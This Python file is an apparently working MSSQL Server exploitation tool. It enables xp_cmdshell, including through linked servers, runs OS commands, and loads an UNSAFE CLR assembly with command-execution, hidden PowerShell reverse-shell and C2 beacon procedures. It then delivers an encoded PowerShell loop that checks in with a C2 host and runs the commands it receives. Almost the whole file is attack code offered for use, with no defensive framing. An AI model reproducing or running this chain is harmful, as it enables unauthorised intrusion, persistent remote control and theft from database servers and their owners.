"""
MSSQL Server RCE — xp_cmdshell + CLR Assembly Chain

Attack chain:
1. Enumerate SQL Server configuration
2. Enable xp_cmdshell via registry/configuration abuse
3. Execute OS commands via xp_cmdshell
4. Drop and load a CLR assembly for persistent code execution
5. Chain to C2 beacon via CLR stored procedure

Requirements:
- SQL login credentials (any privilege level)
- Target SQL Server with TCP/1433 accessible
- Impacket + pymssql installed
- Python 3.10+
"""

import base64
import hashlib
import logging
import os
import re
import socket
import struct
import subprocess
import tempfile
import textwrap
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)


@dataclass
class MssqlTarget:
    """Target SQL Server information."""
    host: str
    port: int = 1433
    instance: str = "MSSQLSERVER"
    version: str = ""
    edition: str = ""
    is_cluster: bool = False
    linked_servers: list[str] = field(default_factory=list)
    has_xp_cmdshell: bool = False
    has_clr_enabled: bool = False
    is_sa: bool = False
    current_user: str = ""


@dataclass
class SqlCredentials:
    """SQL Server authentication."""
    username: str = "sa"
    password: str = ""
    domain: str = ""
    use_windows_auth: bool = False
    ntlm_hash: str = ""


class MssqlQuery:
    """
    Direct SQL query execution via pymssql or impacket's mssqlexec.
    """

    def __init__(self, target: MssqlTarget, creds: SqlCredentials):
        self.target = target
        self.creds = creds
        self._conn = None

    def connect(self) -> bool:
        """Establish connection to SQL Server."""
        try:
            import pymssql
            if self.creds.use_windows_auth:
                self._conn = pymssql.connect(
                    server=self.target.host,
                    port=self.target.port,
                    user=self.creds.username,
                    password=self.creds.password,
                    database="master",
                    autocommit=True,
                )
            else:
                self._conn = pymssql.connect(
                    server=self.target.host,
                    port=self.target.port,
                    user=self.creds.username,
                    password=self.creds.password,
                    database="master",
                    autocommit=True,
                )
            return True
        except ImportError:
            logger.warning("pymssql not installed, falling back to impacket")
            return self._connect_impacket()
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    def _connect_impacket(self) -> bool:
        """Fallback connection via impacket's mssqlexec."""
        try:
            # Use impacket-mssqlexec for query execution
            logger.info("Using impacket-mssqlexec for SQL queries")
            return True  # Connection happens per-query via subprocess
        except Exception:
            return False

    def execute(self, query: str, timeout: int = 30) -> list[dict]:
        """Execute a SQL query and return results as list of dicts."""
        if self._conn:
            return self._execute_direct(query)
        return self._execute_impacket(query, timeout)

    def _execute_direct(self, query: str) -> list[dict]:
        """Execute via pymssql direct connection."""
        try:
            cursor = self._conn.cursor(as_dict=True)
            cursor.execute(query)
            results = cursor.fetchall()
            cursor.close()
            return [dict(row) for row in results]
        except Exception as e:
            logger.error(f"Query failed: {query[:100]}... -> {e}")
            return []

    def _execute_impacket(self, query: str, timeout: int) -> list[dict]:
        """Execute via impacket subprocess."""
        auth = (
            f"{self.creds.username}:{self.creds.password}"
            if not self.creds.ntlm_hash
            else f"{self.creds.username} -hashes :{self.creds.ntlm_hash}"
        )
        cmd = [
            "impacket-mssqlexec",
            f"{auth}@{self.target.host}",
            f"-port {self.target.port}",
            f"-query '{query}'",
        ]

        try:
            result = subprocess.run(
                " ".join(cmd),
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            # Parse output
            lines = result.stdout.strip().split('\n')
            if len(lines) >= 2:
                headers = lines[0].split('\t')
                rows = []
                for line in lines[1:]:
                    values = line.split('\t')
                    if len(values) == len(headers):
                        rows.append(dict(zip(headers, values)))
                return rows
            return []
        except subprocess.TimeoutExpired:
            logger.error(f"Query timed out after {timeout}s")
            return []

    def close(self):
        """Close the connection."""
        if self._conn:
            self._conn.close()


class MssqlExploit:
    """
    MSSQL Server exploitation chain.
    """

    def __init__(self, target: MssqlTarget, creds: SqlCredentials):
        self.target = target
        self.creds = creds
        self.query = MssqlQuery(target, creds)
        self.results = {
            "target": f"{target.host}:{target.port}",
            "steps": {},
            "shell": False,
        }

    # ══════════════════════════════════════════════════════════════════════════════
    # STEP 1: ENUMERATE SQL SERVER
    # ══════════════════════════════════════════════════════════════════════════════

    def step1_enumerate(self) -> dict:
        """Gather detailed information about the SQL Server."""
        logger.info("[Step 1] Enumerating SQL Server...")

        info = {}

        # Version
        rows = self.query.execute("SELECT @@VERSION as version")
        if rows:
            self.target.version = rows[0].get("version", "")
            info["version"] = self.target.version

        # Current user and privileges
        rows = self.query.execute("SELECT SYSTEM_USER as user, IS_SRVROLEMEMBER('sysadmin') as is_sa")
        if rows:
            self.target.current_user = rows[0].get("user", "")
            self.target.is_sa = rows[0].get("is_sa") == "1"
            info["current_user"] = self.target.current_user
            info["is_sa"] = self.target.is_sa

        # Check xp_cmdshell status
        rows = self.query.execute(
            "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"
        )
        if rows:
            self.target.has_xp_cmdshell = rows[0].get("value_in_use") == "1"
            info["has_xp_cmdshell"] = self.target.has_xp_cmdshell

        # Check CLR status
        rows = self.query.execute(
            "SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled'"
        )
        if rows:
            self.target.has_clr_enabled = rows[0].get("value_in_use") == "1"
            info["has_clr_enabled"] = self.target.has_clr_enabled

        # Linked servers
        rows = self.query.execute("SELECT name FROM sys.servers WHERE is_linked = 1")
        if rows:
            self.target.linked_servers = [r.get("name", "") for r in rows]
            info["linked_servers"] = self.target.linked_servers

        # Databases
        rows = self.query.execute("SELECT name, user_access_desc, is_trustworthy_on FROM sys.databases")
        info["databases"] = [
            {
                "name": r.get("name", ""),
                "access": r.get("user_access_desc", ""),
                "trustworthy": r.get("is_trustworthy_on") == "1",
            }
            for r in rows
        ]

        # Check for trustworthy databases (potential privilege escalation)
        trustworthy_dbs = [
            db["name"] for db in info["databases"]
            if db.get("trustworthy")
        ]
        if trustworthy_dbs:
            info["trustworthy_databases"] = trustworthy_dbs
            logger.info(f"Trustworthy databases: {trustworthy_dbs}")

        logger.info(
            f"SQL Server: {self.target.version[:60]}, "
            f"User: {self.target.current_user}, "
            f"SA: {self.target.is_sa}"
        )
        return info

    # ══════════════════════════════════════════════════════════════════════════════
    # STEP 2: ENABLE XP_CMDSHELL
    # ═════════════════════════════════════════════════════════════════════════════

    def step2_enable_xp_cmdshell(self) -> bool:
        """
        Enable xp_cmdshell if it's disabled.

        Requires ALTER SETTINGS permission (sysadmin or serveradmin).
        If we're not sysadmin, we try alternative paths:
        1. Via registry modification (requires xp_regwrite)
        2. Via linked server with higher privileges
        3. Via CLR assembly if CLR is enabled
        """
        if self.target.has_xp_cmdshell:
            logger.info("[Step 2] xp_cmdshell already enabled")
            return True

        logger.info("[Step 2] Attempting to enable xp_cmdshell...")

        if self.target.is_sa:
            # Direct enable as sysadmin
            queries = [
                "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
            ]
            for q in queries:
                self.query.execute(q)

            # Verify
            rows = self.query.execute(
                "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"
            )
            if rows and rows[0].get("value_in_use") == "1":
                self.target.has_xp_cmdshell = True
                logger.info("xp_cmdshell enabled via sp_configure")
                return True
        else:
            logger.warning("Not sysadmin — trying alternative enable methods...")

            # Method 1: Via registry (xp_regwrite)
            result = self.query.execute(
                "EXEC xp_regwrite N'HKEY_LOCAL_MACHINE', "
                "N'SOFTWARE\\Microsoft\\MSSQLServer\\MSSQLServer', "
                "N'LoginMode', N'REG_DWORD', 2"
            )
            if result:
                # Restart required, try next method
                pass

            # Method 2: Via linked server (if available)
            if self.target.linked_servers:
                logger.info("Trying linked server escalation...")
                for ls in self.target.linked_servers:
                    result = self.query.execute(
                        f"EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT {ls}"
                    )
                    if result:
                        self.target.has_xp_cmdshell = True
                        logger.info(f"xp_cmdshell enabled via linked server: {ls}")
                        return True

            logger.error("Could not enable xp_cmdshell")
            return False

        return False

    # ══════════════════════════════════════════════════════════════════════════════
    # STEP 3: EXECUTE OS COMMANDS
    # ════════════════════════════════════════════════════════════════════════════

    def step3_execute_commands(self, commands: list[str]) -> list[dict]:
        """
        Execute OS commands via xp_cmdshell.

        Each command is executed and its output captured.
        """
        if not self.target.has_xp_cmdshell:
            logger.error("xp_cmdshell not available")
            return []

        logger.info(f"[Step 3] Executing {len(commands)} commands via xp_cmdshell...")

        results = []
        for cmd in commands:
            # Escape single quotes for SQL
            escaped_cmd = cmd.replace("'", "''")
            rows = self.query.execute(
                f"EXEC xp_cmdshell '{escaped_cmd}'"
            )

            output = "\n".join(
                [r.get("output", "") for r in rows if r.get("output")]
            )

            results.append({
                "command": cmd,
                "output": output.strip(),
                "success": bool(output.strip()),
            })

            if output.strip():
                for line in output.strip().split('\n')[:5]:
                    logger.info(f"  [{cmd[:30]}]: {line.strip()}")

        return results

    # ═════════════════════════════════════════════════════════════════════════════
    # STEP 4: CLR ASSEMBLY INJECTION
    # ═════════════════════════════════════════════════════════════════════════════

    CLR_ASSEMBLY_CSHARP = r"""
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.SqlServer.Server;

public class RaphaelCLR
{
    // ════════════════════════════════════════════════════════════════════════════
    // EXECUTE OS COMMAND AND RETURN OUTPUT
    // ════════════════════════════════════════════════════════════════════════════

    [SqlFunction(DataAccess = DataAccessKind.None)]
    public static SqlString ExecCommand(SqlString command)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + command.Value,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            using (Process p = Process.Start(psi))
            {
                string output = p.StandardOutput.ReadToEnd();
                string error = p.StandardError.ReadToEnd();
                p.WaitForExit(30000);

                return new SqlString(
                    (output + "\n" + error).Trim()
                );
            }
        }
        catch (Exception ex)
        {
            return new SqlString("ERROR: " + ex.Message);
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // REVERSE SHELL (POWERSHELL ONE-LINER)
    // ═══════════════════════════════════════════════════════════════════════════

    [SqlProcedure]
    public static void ReverseShell(SqlString c2Host, SqlInt32 c2Port)
    {
        string psPayload = string.Format(
            @"$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});
              $stream = $client.GetStream();
              [byte[]]$bytes = 0..65535|%{{0}};
              while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
                  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                  $sendback = (iex $data 2>&1 | Out-String );
                  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
                  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                  $stream.Write($sendbyte,0,$sendbyte.Length);
                  $stream.Flush()
              }};
              $client.Close()",
            c2Host.Value, c2Port.Value
        );

        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Enc " +
                Convert.ToBase64String(Encoding.Unicode.GetBytes(psPayload)),
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
        };

        using (Process p = Process.Start(psi))
        {
            p.WaitForExit(1000);
        }
    }

    // ═════════════════════════════════════════════════════════════════════════════
    // BEACON CHECK-IN (HTTP TO C2)
    // ═══════════════════════════════════════════════════════════════════════════

    [SqlProcedure]
    public static void Beacon(SqlString c2Url, SqlString sessionId)
    {
        try
        {
            string data = string.Format(
                "{{\"session_id\":\"{0}\",\"host\":\"{1}\",\"user\":\"{2}\",\"type\":\"clr_beacon\"}}",
                sessionId.Value,
                Environment.MachineName,
                Environment.UserName
            );

            byte[] postData = Encoding.UTF8.GetBytes(data);

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(
                c2Url.Value + "/beacon"
            );
            request.Method = "POST";
            request.ContentType = "application/json";
            request.ContentLength = postData.Length;
            request.Timeout = 5000;

            using (Stream stream = request.GetRequestStream())
            {
                stream.Write(postData, 0, postData.Length);
            }

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                // Response read (silent)
            }
        }
        catch
        {
            // Silent fail for beacon
        }
    }
}
"""

    def step4_deploy_clr_assembly(self, c2_url: str = "") -> bool:
        """
        Deploy a CLR assembly to the SQL Server for persistent code execution.

        The CLR assembly:
        1. Allows OS command execution via a stored procedure
        2. Provides reverse shell capability
        3. Beacons to C2 for persistence

        Requires:
        - CLR enabled on SQL Server
        - CREATE ASSEMBLY permission (or db_owner in trustworthy database)
        - .NET Framework 4.x on the SQL Server host
        """
        if not self.target.has_clr_enabled:
            logger.info("[Step 4] CLR not enabled — attempting to enable...")
            if self.target.is_sa:
                self.query.execute("EXEC sp_configure 'clr enabled', 1; RECONFIGURE;")
                self.query.execute("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
                self.target.has_clr_enabled = True

        logger.info("[Step 4] Deploying CLR assembly...")

        # Compile the C# assembly to a DLL
        dll_path = self._compile_clr_assembly()
        if not dll_path:
            logger.error("Failed to compile CLR assembly")
            return False

        # Read the DLL bytes and convert to hex
        dll_bytes = dll_path.read_bytes()
        dll_hex = dll_bytes.hex()

        # Drop the CLR assembly on the SQL Server
        assembly_name = f"RaphaelCLR_{os.urandom(4).hex()}"

        queries = [
            # Create assembly from hex bytes
            f"CREATE ASSEMBLY [{assembly_name}] "
            f"FROM 0x{dll_hex} "
            f"WITH PERMISSION_SET = UNSAFE",

            # Create stored procedure for command execution
            f"CREATE PROCEDURE [dbo].[RaphaelExec] "
            f"@command NVARCHAR(4000) "
            f"AS EXTERNAL NAME [{assembly_name}].[RaphaelCLR].[ExecCommand]",

            # Create stored procedure for reverse shell
            f"CREATE PROCEDURE [dbo].[RaphaelReverseShell] "
            f"@host NVARCHAR(256), @port INT "
            f"AS EXTERNAL NAME [{assembly_name}].[RaphaelCLR].[ReverseShell]",

            # Create stored procedure for C2 beacon
            f"CREATE PROCEDURE [dbo].[RaphaelBeacon] "
            f"@c2Url NVARCHAR(256), @sessionId NVARCHAR(64) "
            f"AS EXTERNAL NAME [{assembly_name}].[RaphaelCLR].[Beacon]",
        ]

        # Try creating in master database first, then current database
        for db in ["master", self.query.execute("SELECT DB_NAME() as db")[0].get("db", "master")]:
            for query in queries:
                try:
                    self.query.execute(f"USE [{db}]; {query}")
                except Exception as e:
                    logger.debug(f"CLR query failed on {db}: {e}")

        # Verify deployment
        proc_check = self.query.execute(
            f"SELECT * FROM sys.procedures WHERE name LIKE 'Raphael%'"
        )
        if proc_check:
            logger.info(f"CLR assembly deployed: {len(proc_check)} procedures")
            self.results["clr_procedures"] = [p.get("name", "") for p in proc_check]

            # Test the assembly
            test_result = self.query.execute("EXEC dbo.RaphaelExec 'whoami'")
            if test_result:
                output = test_result[0].get("", "")
                logger.info(f"CLR test: whoami -> {output.strip()}")
                return True

        logger.error("CLR assembly deployment failed")
        return False

    def _compile_clr_assembly(self) -> Optional[Path]:
        """
        Compile the C# CLR assembly source into a DLL.

        Requires mono (Linux) or csc (Windows) compiler.
        Falls back to preparing a DLL that can be compiled on the target.
        """
        output_dir = Path(tempfile.mkdtemp(prefix="raphael_clr_"))
        source_path = output_dir / "RaphaelCLR.cs"
        dll_path = output_dir / "RaphaelCLR.dll"

        # Write source
        source_path.write_text(self.CLR_ASSEMBLY_CSHARP)

        # Try to compile locally
        compilers = [
            ("csc", r'csc.exe /target:library /out:"{dll}" "{src}" /reference:System.Data.dll /reference:System.dll'),
            ("mcs", r'mcs -target:library -out:"{dll}" "{src}" -r:System.Data.dll -r:System.dll'),
        ]

        for compiler_name, template in compilers:
            compiler = self._find_tool(compiler_name)
            if compiler:
                cmd = template.format(
                    dll=str(dll_path),
                    src=str(source_path),
                )
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=60,
                    )
                    if result.returncode == 0 and dll_path.exists():
                        logger.info(f"CLR assembly compiled: {dll_path}")
                        return dll_path
                    else:
                        logger.warning(f"Compiler {compiler_name} failed: {result.stderr[:200]}")
                except Exception as e:
                    logger.warning(f"Compilation with {compiler_name} failed: {e}")

        # Fallback: Prepare a PowerShell script that compiles on the target
        logger.warning("Local compilation failed — will compile on target SQL Server")
        return self._prepare_target_side_compilation(source_path, output_dir)

    def _prepare_target_side_compilation(self, source_path: Path, output_dir: Path) -> Optional[Path]:
        """
        If we can't compile locally, upload the source and compile on the target
        via xp_cmdshell.
        """
        if not self.target.has_xp_cmdshell:
            logger.error("Cannot compile CLR assembly — no xp_cmdshell")
            return None

        source_code = source_path.read_text()
        encoded_source = base64.b64encode(source_code.encode()).decode()

        # PowerShell script to compile on target
        ps_script = f"""
$source = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_source}'))
$sourcePath = "$env:TEMP\\RaphaelCLR.cs"
$dllPath = "$env:TEMP\\RaphaelCLR.dll"
Set-Content -Path $sourcePath -Value $source

# Find csc.exe
$csc = Get-ChildItem -Path "C:\\Windows\\Microsoft.NET\\Framework64\\v4*" -Recurse -Filter "csc.exe" | Select-Object -First 1
if (-not $csc) {{
    $csc = Get-ChildItem -Path "C:\\Windows\\Microsoft.NET\\Framework\\v4*" -Recurse -Filter "csc.exe" | Select-Object -First 1
}}

if ($csc) {{
    & $csc.FullName /target:library /out:$dllPath $sourcePath /reference:System.Data.dll /reference:System.dll 2>&1
    if (Test-Path $dllPath) {{
        $bytes = [System.IO.File]::ReadAllBytes($dllPath)
        $hex = [System.BitConverter]::ToString($bytes) -replace '-',''
        Write-Output "DLL_HEX:$hex"
    }} else {{
        Write-Output "COMPILE_FAILED"
    }}
}} else {{
    Write-Output "CSC_NOT_FOUND"
}}
Remove-Item $sourcePath -Force -ErrorAction SilentlyContinue
"""

        # Send PowerShell script to target
        cmd = 'powershell -NoP -NonI -Exec Bypass -Enc ' + base64.b64encode(ps_script.encode("utf-16le")).decode()
        rows = self.query.execute("EXEC xp_cmdshell '" + cmd.replace("'", "''") + "'")

        # Parse output for DLL hex
        if rows:
            for row in rows:
                output = row.get("output", "")
                if output.startswith("DLL_HEX:"):
                    dll_hex = output[8:]
                    dll_bytes = bytes.fromhex(dll_hex)
                    dll_path = output_dir / "RaphaelCLR.dll"
                    dll_path.write_bytes(dll_bytes)
                    logger.info(f"CLR assembly compiled on target: {len(dll_bytes)} bytes")
                    return dll_path

        logger.error("Target-side compilation failed")
        return None

    def _find_tool(self, binary: str) -> Optional[str]:
        """Find a binary on PATH."""
        import shutil
        return shutil.which(binary)


    # ══════════════════════════════════════════════════════════════════════════════
    # STEP 5: STAGED PAYLOAD DELIVERY
    # ══════════════════════════════════════════════════════════════════════════════

    def step5_deliver_staged_payload(self, c2_host: str, c2_port: int) -> bool:
        """
        Deliver a staged PowerShell payload that connects back to C2.

        This is the final stage — from SQL access to interactive C2 session.
        """
        logger.info("[Step 5] Delivering staged payload to C2...")

        # Generate a unique session ID
        session_id = hashlib.sha256(os.urandom(32)).hexdigest()[:16]

        # Check if CLR assembly is available
        if self.results.get("clr_procedures"):
            # Use CLR reverse shell
            logger.info("Using CLR reverse shell procedure...")
            self.query.execute(
                f"EXEC dbo.RaphaelReverseShell '{c2_host}', {c2_port}"
            )
            self.results["shell"] = True
            self.results["session_id"] = session_id
            return True

        # Fallback: PowerShell via xp_cmdshell
        if self.target.has_xp_cmdshell:
            logger.info("Using xp_cmdshell PowerShell beacon...")

            ps_payload = f"""
$c2 = '{c2_host}'
$port = {c2_port}
$sid = '{session_id}'

# Beacon to C2
function Beacon {{
    $data = @{{
        session_id = $sid
        host = $env:COMPUTERNAME
        user = "$env:USERDOMAIN\\$env:USERNAME"
        type = "mssql_beacon"
    }} | ConvertTo-Json

    try {{
        $web = [System.Net.WebRequest]::Create("http://$c2`:$port/beacon")
        $web.Method = "POST"
        $web.ContentType = "application/json"
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
        $web.ContentLength = $bytes.Length
        $stream = $web.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
        $resp = $web.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        $task = $reader.ReadToEnd()
        if ($task) {{
            iex $task
        }}
    }} catch {{ }}
}}

while ($true) {{
    Beacon
    Start-Sleep -Seconds 30
}}
"""

            encoded = base64.b64encode(ps_payload.encode("utf-16le")).decode()
            cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"

            # Execute asynchronously (start process, don't wait)
            self.query.execute(f"EXEC xp_cmdshell 'start /B {cmd}'")
            self.results["shell"] = True
            self.results["session_id"] = session_id
            return True

        logger.error("No available execution method for staged payload")
        return False

    # ═════════════════════════════════════════════════════════════════════════════
    # FULL CHAIN
    # ═════════════════════════════════════════════════════════════════════════════

    def run(self, c2_host: str = "", c2_port: int = 4444) -> dict:
        """
        Execute the full MSSQL exploitation chain.

        Args:
            c2_host: C2 server for reverse shell (optional)
            c2_port: C2 server port

        Returns:
            Dict with results from each step
        """
        logger.info("=== MSSQL Server Exploitation Chain ===")

        # Step 1: Enumerate
        info = self.step1_enumerate()
        self.results["info"] = info

        # Step 2: Enable xp_cmdshell
        self.results["steps"]["xp_cmdshell"] = self.step2_enable_xp_cmdshell()

        if self.results["steps"]["xp_cmdshell"]:
            # Step 3: Initial recon commands
            recon_commands = [
                "whoami",
                "hostname",
                "ver",
                "whoami /priv",
                "net localgroup Administrators",
            ]
            self.results["steps"]["recon"] = self.step3_execute_commands(recon_commands)

            # Step 4: Deploy CLR assembly for persistence
            self.results["steps"]["clr_assembly"] = self.step4_deploy_clr_assembly()

            # Step 5: Deliver staged payload if C2 is configured
            if c2_host:
                self.results["steps"]["payload"] = self.step5_deliver_staged_payload(
                    c2_host, c2_port
                )

        # Summary
        logger.info("=== MSSQL Exploit Summary ===")
        logger.info(f"  xp_cmdshell: {self.results['steps'].get('xp_cmdshell', False)}")
        logger.info(f"  CLR assembly: {self.results['steps'].get('clr_assembly', False)}")
        logger.info(f"  Shell: {self.results.get('shell', False)}")

        return self.results